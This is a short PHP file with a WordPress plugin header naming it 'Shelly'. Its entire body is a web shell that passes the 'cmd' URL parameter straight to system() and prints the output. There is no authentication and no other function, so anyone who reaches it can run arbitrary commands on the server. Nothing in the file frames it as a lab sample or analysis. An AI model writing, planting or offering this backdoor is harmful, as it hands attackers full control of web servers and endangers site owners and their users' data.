<?php
/*
Plugin Name: Shelly
*/
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} ?>